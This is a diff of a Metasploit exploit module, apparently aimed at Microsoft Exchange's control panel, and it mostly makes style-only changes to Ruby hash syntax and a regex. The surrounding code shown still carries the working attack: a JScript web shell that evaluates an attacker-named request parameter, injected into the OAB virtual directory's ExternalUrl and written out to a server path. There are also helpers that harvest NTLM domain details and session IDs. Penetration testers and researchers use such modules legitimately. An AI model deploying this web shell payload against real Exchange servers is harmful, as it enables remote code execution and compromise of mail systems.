@@ -155,15 +155,15 @@ class MetasploitModule < Msf::Exploit::Remote
     input_name = rand_text_alpha(4..8).to_s
     shell = "http://o/#<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"#{input_name}\"],\"unsafe\");}</script>"
     data = {
-      'identity': {
-        '__type': 'Identity:ECP',
-        'DisplayName': (exploit_info[4][0]).to_s,
-        'RawIdentity': (exploit_info[4][1]).to_s
+      identity: {
+        __type: 'Identity:ECP',
+        DisplayName: (exploit_info[4][0]).to_s,
+        RawIdentity: (exploit_info[4][1]).to_s
       },
-      'properties': {
-        'Parameters': {
-          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
-          'ExternalUrl': shell.to_s
+      properties: {
+        Parameters: {
+          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
+          ExternalUrl: shell.to_s
         }
       }
     }.to_json
@@ -204,8 +204,8 @@ class MetasploitModule < Msf::Exploit::Remote
     size = message[offset + 2].unpack('C').first
 
     return {
-      :message => message[offset + 3, size].gsub(/\0/,''),
-      :new_offset => offset + size
+      message: message[offset + 3, size].gsub(/\0/, ''),
+      new_offset: offset + size
     }
   end
 
@@ -255,7 +255,7 @@ class MetasploitModule < Msf::Exploit::Remote
     end
     fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.nil? || server.empty?
 
-    client_id = response.get_cookies.scan(/ClientId=([\w]+);*/)&.flatten[0]
+    client_id = response.get_cookies.scan(/ClientId=(\w+);*/).flatten[0]
     fail_with(Failure::NotFound, 'No \'Client ID\' was found') if client_id.nil? || client_id.empty?
 
     [server, legacy_dn, client_id]
@@ -274,7 +274,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     if received.code == 401 && received['WWW-Authenticate'] && received['WWW-Authenticate'].match(/^NTLM/i)
       hash = received['WWW-Authenticate'].split('NTLM ')[1]
-      message = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_info].value()
+      message = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_info].value
 
       # Retrieve Domain name subblock info
       nb_domain = parse_ntlm_info(message, "\x02\x00", 0)
@@ -321,14 +321,14 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def request_oab(server_name, sid, session, canary)
     data = {
-      'filter': {
-        'Parameters': {
-          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
-          'SelectedView': '',
-          'SelectedVDirType': 'OAB'
+      filter: {
+        Parameters: {
+          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
+          SelectedView: '',
+          SelectedVDirType: 'OAB'
         }
       },
-      'sort': {}
+      sort: {}
     }.to_json
 
     response = send_http(
@@ -530,15 +530,15 @@ class MetasploitModule < Msf::Exploit::Remote
     end
 
     data = {
-      'identity': {
-        '__type': 'Identity:ECP',
-        'DisplayName': (exploit_info[4][0]).to_s,
-        'RawIdentity': (exploit_info[4][1]).to_s
+      identity: {
+        __type: 'Identity:ECP',
+        DisplayName: (exploit_info[4][0]).to_s,
+        RawIdentity: (exploit_info[4][1]).to_s
       },
-      'properties': {
-        'Parameters': {
-          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
-          'FilePathName': remote_path.to_s
+      properties: {
+        Parameters: {
+          __type: 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
+          FilePathName: remote_path.to_s
         }
       }
     }.to_json
